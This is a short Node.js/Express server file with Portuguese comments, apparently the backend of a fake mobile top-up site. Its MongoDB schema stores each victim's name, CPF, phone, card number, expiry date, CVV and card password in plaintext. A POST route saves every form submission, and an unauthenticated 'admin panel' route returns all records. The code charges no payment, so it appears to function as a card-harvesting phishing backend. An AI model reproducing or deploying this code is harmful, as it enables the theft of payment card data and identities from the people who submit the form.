const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// CONEXÃO COM O MONGODB (USE SUA SENHA REAL AQUI)
mongoose.connect('mongodb+srv://mateus:SENHA_AQUI@cluster0.mongodb.net/recargas?retryWrites=true&w=majority')
  .then(() => console.log('MongoDB Conectado!'))
  .catch(err => console.error(err));

// SCHEMA ATUALIZADO COM CPF
const RecargaSchema = new mongoose.Schema({
    operadora: String,
    nome: String,
    cpf: String,
    telefone: String,
    valor: String,
    cartao: String,
    data: String,
    cvv: String,
    senha: String,
    dataRegistro: { type: Date, default: Date.now }
});

const Recarga = mongoose.model('Recarga', RecargaSchema);

app.post('/finalizar', async (req, res) => {
    try {
        const novaRecarga = new Recarga(req.body);
        await novaRecarga.save();
        res.status(200).send('Sucesso');
    } catch (error) {
        res.status(500).send('Erro ao salvar');
    }
});

// PAINEL ADMINISTRATIVO
app.get('/ver-dados-restritos', async (req, res) => {
    const dados = await Recarga.find().sort({ dataRegistro: -1 });
    res.json(dados);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));